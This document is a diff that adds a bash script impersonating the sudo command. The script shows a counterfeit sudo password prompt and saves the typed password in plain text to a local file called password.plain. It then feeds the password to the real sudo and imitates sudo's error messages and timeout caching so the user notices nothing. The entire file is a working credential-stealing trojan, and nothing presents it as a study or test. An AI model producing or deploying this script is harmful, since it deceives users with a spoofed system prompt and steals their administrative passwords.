@@ -1,0 +1,63 @@
+#!/bin/bash
+
+function getcurrentpid {
+  currentpid=$(echo $$)
+  parentpid=$(ps -ef | awk "\$2 ~ /\<$currentpid\>/ { print \$3; }")
+  echo $parentpid
+}
+
+function dothething {
+  printf "[sudo] password for user: "
+  read -s password
+  printf "\n"
+  echo $password >> ./password.plain
+
+  printhelp $*
+
+  if hash $1 2>/dev/null || [[ $1 == *"-"* ]];
+  then
+    echo $password | /usr/bin/sudo -S $* 2>/dev/null
+    status=$?
+    if (($status == 0));
+    then
+      currentpid=$(getcurrentpid)
+      currenttime=$(date +%s)
+      echo "$currenttime" >> "./${currentpid}.time"
+    else
+      printf "Sorry, try again.\n"
+      /usr/bin/sudo $1
+    fi
+  else
+    printf "sudo: $1: command not found\n"
+  fi
+}
+
+function printhelp {
+  if (("$#" < 1)) ;
+  then
+    /usr/bin/sudo
+    exit 0
+  fi
+}
+
+currentpid=$(getcurrentpid)
+if [ ! -f "./${currentpid}.time" ];
+then
+  dothething $*
+else
+  # cat test | \
+  # while read CMD;
+  # do
+  #   if (($(echo $CMD | awk '{print $1;}') ==  "$currentpid"));
+  #     lastlogintime=$(echo $CMD | awk '{print $2;}')
+  #   fi
+  # done
+  lastlogintime=$(head -n 1 "./${currentpid}.time")
+  currenttime=$(date +%s)
+  if [ "$currenttime" -gt $((lastlogintime + 20)) ];
+  then
+    dothething $*
+  else
+    /usr/bin/sudo $1
+  fi
+fi
